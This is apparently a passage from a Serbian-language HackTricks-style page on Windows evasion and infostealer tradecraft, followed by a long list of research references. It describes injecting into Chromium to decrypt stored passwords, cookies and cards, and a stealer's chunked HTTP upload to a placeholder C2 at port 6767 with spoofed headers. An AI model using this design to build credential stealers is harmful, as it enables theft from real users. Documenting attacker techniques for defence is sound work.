- ChromElevator rutine koriste reflective process hollowing putem direct syscall-a kako bi izvršile injection u aktivni Chromium browser, nasledile AppBound Encryption ključeve i dešifrovale lozinke/cookies/platne kartice direktno iz SQLite baza, uprkos ABE hardeningu.


### Modularno prikupljanje u memoriji i HTTP exfil u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, screenshots, dokumenti, browser ekstenzije itd.). Svaka nit upisuje rezultate u deljene buffere i prijavljuje broj svojih fajlova nakon prozora za pridruživanje od približno 45 s.
- Po završetku, sve se zipuje pomoću statički linkovane `miniz` biblioteke kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 s i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki deo dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Advanced Evasion Tradecraft: Precizno gaženje modula](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, više nema besplatnih prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za spoofing call stack-a](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi infection chain i obfuskacija zasnovana na ConfuserEx-u za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba verovati svom zero trust-u? Zaobilaženje Zscaler posture provera](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Zloupotreba prosleđenih exporta](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 inventar prosleđenih exporta (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dynamic-link library biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz podršku Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitnog omotača Windows Defendera tehnikom preusmeravanja foldera](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: Od RAT-a do buildera i codera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer dolazi u grad: Novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App Bound Encryption-a](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Poražavanje Node.js malware-a pomoću API tracing-a](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Stavljanje Adaptix-a na spavanje pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET i spoofing stack-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko obfuskacija spavanja](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje Dotnet ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: Praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Pretvaranje Defenderovog remediation drivera u kernel operation primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
